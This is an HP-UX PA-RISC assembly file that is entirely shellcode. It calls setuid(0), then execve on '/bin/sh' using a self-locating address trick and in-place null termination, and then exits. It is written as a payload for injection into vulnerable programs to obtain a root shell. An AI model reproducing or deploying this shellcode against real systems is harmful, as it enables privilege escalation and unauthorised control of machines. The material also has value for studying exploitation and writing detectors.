    .SPACE $TEXT$
    .SUBSPA $CODE$,QUAD=0,ALIGN=8,ACCESS=44

    .align 4
    .EXPORT main,ENTRY,PRIV_LEV=3,ARGW0=GR,ARGW1=GR
main

    bl         shellcode, %r1
    nop
    .SUBSPA $DATA$
    .EXPORT shellcode; So we could see it in debugger
shellcode
        xor     %r26, %r26, %r26; 0 - argv0
        ldil    L%0xc0000000,%r1;  entry point
        ble     0x4(%sr7,%r1)    ;
        ldi     23, %r22

jump
        bl      .+8,%r1      ; address into %r1
        nop
        stb     %r0, SHELL-jump+7-11(%sr0,%r1)

        xor     %r25, %r25, %r25; NULL ->arg1
        ldi     SHELL-jump-11, %r26;
        add     %r1, %r26, %r26;

        ldil    L%0xc0000000,%r1;  entry point
        ble     0x4(%sr7,%r1)    ;
        ldi     11, %r22;

        xor     %r26, %r26, %r26; return 0
        ldil    L%0xc0000000,%r1;  entry point
        ble     0x4(%sr7,%r1)    ;
        ldi     1, %r22          ; exit 

SHELL
                .STRING "/bin/shA";

endofshellcode
